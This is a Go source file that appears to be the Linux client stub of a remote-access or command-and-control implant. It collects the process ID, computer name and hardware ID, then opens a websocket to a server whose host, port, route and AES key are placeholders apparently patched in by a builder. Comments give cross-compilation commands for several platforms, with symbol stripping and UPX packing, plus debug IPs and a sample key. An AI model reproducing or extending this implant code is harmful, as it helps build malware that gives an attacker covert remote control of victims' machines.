//go:build linux
// +build linux

package main

import (
	"main/PcInfo"
	Websocket "main/Socket/ws"
	"strings"
)

var ClientWorking bool

func main() {
	PcInfo.ProcessID = PcInfo.GetProcessID()
	PcInfo.GroupInfo = "Linux"
	PcInfo.ClientComputer = PcInfo.GetClientComputer()
	PcInfo.HWID = PcInfo.GetHWID()

	//release
	Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
	Port := "PortAAAABBBBCCCCDDDD"
	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
	route := "RouteAAAABBBBCCCCDDDD"
	PcInfo.AesKey = "AeskAAAABBBBCCCC"
	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")

	//PcInfo.PcInfo.GetHWID()

	///Debug

	// Host := "10.211.55.4"
	// Port := "4000"
	// PcInfo.ListenerName = "asd"
	// route := "www"
	// PcInfo.AesKey = "QWERt_CSDMAHUATW"

	//url := "ws://127.0.0.1:80/Echo"
	url := "ws://" + Host + ":" + Port + "/" + route
	url = strings.ReplaceAll(url, " ", "")
	Websocket.Run_main(url)
}

//HostPort := "10.212.202.87:8880"
//HostPort = strings.ReplaceAll(HostPort, " ", "")
//run_main(HostPort)

//cmd:
//Linux：
//set GOOS=linux
//set GOARCH=amd64

//windows:
//set GOOS=windows
//set GOARCH=amd64

//powershell:
//Linux:
//$env:GOOS="linux"
//$env:GOARCH="amd64"
//Windows:
//$env:GOOS="windows"
//$env:GOARCH="amd64"

//CGO_ENABLED=0 GOOS=linux go build -a -ldflags="-s -w" -installsuffix cgo -o Winmain.exe main.go && upx -9 Client
//set GOARCH=mips
//set GOOS=linux

//MacOS
//set GOOS=darwin
//set GOARCH=amd64
